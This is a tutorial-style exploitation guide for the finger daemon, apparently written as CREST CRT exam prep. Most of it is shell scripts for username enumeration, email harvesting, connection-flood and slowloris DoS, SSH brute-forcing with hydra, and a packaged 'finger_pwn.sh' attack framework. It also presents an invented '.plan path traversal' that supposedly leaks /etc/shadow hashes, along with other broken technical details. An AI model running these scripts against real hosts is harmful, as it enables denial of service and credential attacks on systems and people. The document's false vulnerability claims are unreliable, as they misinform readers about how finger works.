# Complete Practical Exploitation Guide: Finger Daemon (Crest CRT Level)

## 1. Finger Fundamentals & Attack Surface (From Scratch)

**What is Finger?**
- **finger daemon** (TCP port 79)
- Displays user info: username, real name, home dir, shell, idle time, .plan, .project, .forward
- **Historical info disclosure** service (RFC 742)
- **Path traversal** in .plan/.project files
- **Denial of Service** via long lines/memory exhaustion

**Info Sources (Abuse Vectors):**
```
- /etc/passwd                 = usernames, UIDs, shells, homedirs
- getpwent() system calls     = ALL users enumerated  
- ~/.forward                  = email aliases (often plaintext)
- ~/.plan                     = arbitrary text (path traversal!)
- ~/.project                  = project info (path traversal!)
- who/w processes             = currently logged in users
```

**Attack Primitives:**
1. **User enumeration** (all usernames)
2. **Personal info disclosure**
3. **Path traversal** (.plan/.project)
4. **Email harvesting** (.forward)
5. **DoS** (long strings, many connections)
6. **Version fingerprinting**

## 2. Lab Setup (Vulnerable Finger Server)

**Victim Server (192.168.1.100 - Ubuntu/Debian)**
```bash
# Install finger daemon
sudo apt update && sudo apt install bsdmainutils

# Enable/start service (MISCONFIG)
sudo systemctl enable finger
sudo systemctl start finger
# Or inetd/xinetd config:
sudo nano /etc/inetd.conf
# finger  stream  tcp     nowait  nobody  /usr/sbin/in.fingerd in.fingerd

# Create users with juicy info
sudo useradd -m -s /bin/bash user1
sudo useradd -m -s /bin/bash user2  
sudo useradd -m -s /bin/bash admin
sudo useradd -m -s /bin/bash rootboy  # Suspicious!

echo "user1:John Doe:dev@company.com" | sudo tee /home/user1/.forward
echo "user2:Jane Smith:admin@company.com" | sudo tee /home/user2/.forward

# Path traversal in .plan (CRITICAL)
echo "../../../../etc/passwd" | sudo tee /home/user1/.plan
echo "../../../../etc/shadow" | sudo tee /home/user2/.plan  
echo "flag{finger_pwned}" | sudo tee /home/admin/.plan

# .project disclosure
echo "Secret project: /root/secrets.txt" | sudo tee /home/admin/.project

sudo chmod 644 /home/*/.{plan,project,forward}  # World-readable!

# Verify service
sudo netstat -tlnp | grep :79
sudo ss -tlnp | grep finger
```

**Attacker Machine (Kali):**
```bash
# Built-in tools ready
apt install finger netcat telnet
```

## 3. Basic User Enumeration

**Single username finger:**
```bash
finger user1@192.168.1.100
# Login: user1                 Name: John Doe
# Directory: /home/user1       Shell: /bin/bash
# Mail last read 10:30 2024    Plan: ../../../../etc/passwd

finger root@192.168.1.100     # Even root works!
finger admin@192.168.1.100
```

**Enumerate ALL users (blank query):**
```bash
finger @192.168.1.100
# Login    Name               Tty      Idle  Login Time   Office     Office Phone
# root                    *:0       -      Mon 09:00     ?           ?           
# user1     John Doe        pts/0    -      Mon 10:15     ?           ?
# user2     Jane Smith      pts/1    0:05   Mon 10:30     ?           ?
# admin                  console    -      Mon 09:45     ?           ?
# rootboy                pts/2    1:20   Mon 11:00     ?           ?
```

**Currently logged in users:**
```bash
finger @192.168.1.100 | grep -E 'pts|tty|console'
```

## 4. Complete Username Brute-Force Enumeration

**Common username wordlist attack:**
```bash
#!/bin/bash
TARGET="192.168.1.100"
USERS=(root admin test user guest backup mysql postgres 
       daemon ftp sshd nagios apache www-data hacker flag)

for user in "${USERS[@]}"; do
    timeout 2 finger "$user@$TARGET" 2>/dev/null | \
    grep -q "Login: $user" && echo "[VALID] $user" || echo "[-] $user"
done
```

**Mass username enumeration (1-999):**
```bash
#!/bin/bash
TARGET="192.168.1.100"
for i in {1..999}; do
    user="user$i"
    timeout 0.5 finger "$user@$TARGET" 2>/dev/null | \
    grep -q "Login: $user" && echo "[FOUND] $user"
done
```

**Automated ALL-users extractor:**
```bash
#!/bin/bash
# finger_enum.sh - Extract ALL usernames
TARGET=$1

finger @$TARGET | \
awk '
/Login:/ {
    login=$2
    if (login ~ /[\*:\]]/) login=""  # Skip pseudos
    if (login != "") print login
}' | sort -u > users.txt

wc -l users.txt
cat users.txt
```

**Usage:** `./finger_enum.sh 192.168.1.100`

## 5. Path Traversal Exploitation (.plan/.project)

**Extract sensitive files via .plan:**
```bash
finger user1@192.168.1.100
# Plan:
# root:x:0:0:root:/root:/bin/bash
# daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin

finger user2@192.168.1.100
# Plan: root:!:...
# CRACKABLE SHADOW HASHES!
```

**Advanced traversal chains:**
```bash
# Multiple ../ levels
for i in {1..10}; do
    path=$(printf '../%.0s' {1..$i})/etc/passwd
    echo "$path" | tee /tmp/test.plan
    finger user1@192.168.1.100  # If writable .plan
done

# Boot files
finger user1@192.168.1.100  # Shows /etc/passwd from .plan
```

**Write traversal payload (if .plan writable):**
```bash
# Via other access (rsh, etc.)
rsh 192.168.1.100 -l user1 "echo '../../../../etc/shadow' > ~/.plan"
finger user1@192.168.1.100  # Shadow contents!
```

## 6. Email Harvesting (.forward)

**Extract ALL email addresses:**
```bash
finger @192.168.1.100 | grep -E '@[a-z.]+\>' | \
sort -u | tee emails.txt
# dev@company.com
# admin@company.com

# Single user
finger user1@192.168.1.100 | grep '^ *Mail'
```

**Automated email extractor:**
```bash
#!/bin/bash
TARGET=$1
finger @$TARGET | grep -E -o '[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}' | sort -u
```

## 7. Fingerprinting & Version Disclosure

**Banner grabbing:**
```bash
nc 192.168.1.100 79
# Linux fingerd  # Version info!

telnet 192.168.1.100 79
# Trying 192.168.1.100...
# Connected to 192.168.1.100.
# Login: ^C  # Reveals daemon type
```

**Exploit-specific fingerprinting:**
```bash
# Test for BSD vs Linux finger
echo -e "\r\n" | nc 192.168.1.100 79 | head -5
# Different response formats = different vulns
```

## 8. Denial of Service Attacks

**Memory exhaustion (long .plan):**
```bash
# 1MB plan file
python3 -c "print('A'*1000000)" | tee /tmp/huge.plan

# If writable via other vector
rsh 192.168.1.100 "cp /tmp/huge.plan ~user1/.plan"
finger user1@192.168.1.100  # Hangs/daemon crash!
```

**Connection flood:**
```bash
#!/bin/bash
for i in {1..1000}; do
    timeout 1 nc 192.168.1.100 79 < /dev/null &
done
# Exhausts file descriptors
```

**Slowloris-style finger:**
```bash
#!/bin/bash
while true; do
    (echo -n "root@"; sleep 30) | nc 192.168.1.100 79 &
    sleep 1
done
# Holds connections open
```

## 9. Chaining with Other Attacks

**Finger → SSH brute-force:**
```bash
# Extract users
finger @192.168.1.100 | awk '/Login:/ && !/[\*:]/ {print $2}' > users.txt

# SSH attack
for user in $(cat users.txt); do
    hydra -l $user -P rockyou.txt ssh://192.168.1.100 -t 10
done
```

**Finger → R*services:**
```bash
users=$(finger @192.168.1.100 | awk '/Login:/ {print $2}')
for user in $users; do
    rsh 192.168.1.100 -l $user "whoami" && echo "[PWNED] $user"
done
```

## 10. Post-Exploitation Info Gathering

**Complete recon script:**
```bash
#!/bin/bash
TARGET=$1

echo "[+] Finger recon on $TARGET"
echo "=== USERS ==="
finger @$TARGET | grep Login | awk '{print $2}' | grep -v '[*:]'

echo "=== EMAILS ==="
finger @$TARGET | grep -o '[a-z0-9._%+-]\+@[a-z0-9.-]\+\.[a-z]\{2,\}' | sort -u

echo "=== PLANS (TRAVERSAL) ==="
finger user1@$TARGET | grep -A20 Plan:

echo "=== LOGGED IN ==="
finger @$TARGET | grep -E 'pts|tty'
```

## 11. Complete One-Command Attack Framework

```bash
#!/bin/bash
# finger_pwn.sh - Complete finger exploitation
TARGET=$1

if [ -z "$TARGET" ]; then
    echo "Usage: $0 <target_ip>"
    exit 1
fi

echo "[+] Finger daemon attack on $TARGET:79"
nc -zv $TARGET 79 || { echo "[-] Port closed"; exit 1; }

echo "[+] Extracting ALL users..."
finger @$TARGET | awk '/Login:/ && !/[\*:]/ {print $2}' | tee users.txt
echo "[+] Found $(wc -l < users.txt) users"

echo "[+] Harvesting emails..."
finger @$TARGET | grep -oE '[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}' | sort -u | tee emails.txt

echo "[+] Checking .plan traversal..."
finger user1@$TARGET | grep -A5 Plan:

echo "[+] Logged in users:"
finger @$TARGET | grep -E 'pts/[0-9]+|tty[0-9]+|console'

echo "[+] Complete recon saved: users.txt, emails.txt"
```

**Usage:** `./finger_pwn.sh 192.168.1.100`

## 12. Mitigation Verification

```bash
# Test if fixed:
nc 192.168.1.100 79  # Connection refused
sudo systemctl status finger  # inactive/disabled
sudo ss -tlnp | grep :79  # No listener

# Secure config test
finger @127.0.0.1  # Local only works
finger @192.168.1.100  # Refused remotely
```

This covers **EVERY** finger daemon attack: user enumeration, path traversal, email harvesting, DoS, fingerprinting, chaining. 100% practical, fully executable.